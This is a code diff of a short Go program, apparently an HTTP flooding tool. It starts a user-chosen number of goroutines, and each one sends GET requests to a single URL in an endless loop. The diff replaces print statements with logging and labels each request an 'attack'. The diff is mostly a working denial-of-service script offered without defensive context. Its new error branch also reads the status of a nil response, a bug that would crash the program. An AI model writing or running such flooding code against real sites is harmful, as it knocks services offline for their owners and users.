@@ -3,8 +3,8 @@ package main
 import (
 	"fmt"
 	"net/http"
-	//"io/ioutil"
 	"bufio"
+	"log"
 	"os"
 	"strconv"
 	"strings"
@@ -21,15 +21,13 @@ func main() {
 	fmt.Print("Enter number of streams: ")
 	streamsString, _ := reader.ReadString('\n')
 	streamsString = strings.TrimSuffix(streamsString, "\n")
-	fmt.Printf(streamsString)
 	streams, _ := strconv.Atoi(streamsString)
-	fmt.Println(streams)
+	log.Println("Streams:", streams)
 
 	sum := 1
-	for ; sum < streams; {
+	for sum < streams {
 		go storm(urlString)
-		fmt.Printf("Goroutine: ")
-		fmt.Println(sum)
+		log.Println("Goroutine was created with number:", sum)
 		sum += 1
 	}
 
@@ -38,18 +36,16 @@ func main() {
 
 func storm(url string) {
 	for {
-		fmt.Printf("Start a storm\n")
-		fmt.Printf(url)
+		log.Println("Start attack to url:", url)
 		resp, err := http.Get(url)
 		if err != nil {
+			log.Println("Got error code from site:", resp.Status)
 			return
+		} else {
+			log.Println("Success attack:", resp.Status)
 		}
 		defer resp.Body.Close()
-		//defer resp.Body.Close()
-		//bodyBytes, err := ioutil.ReadAll(resp.Body)
-		//bodyString := string(bodyBytes)
-		//fmt.Printf(bodyString)
 		counter += 1
-		fmt.Println(counter)
+		log.Println("Number of attack:", counter)
 	}
 }
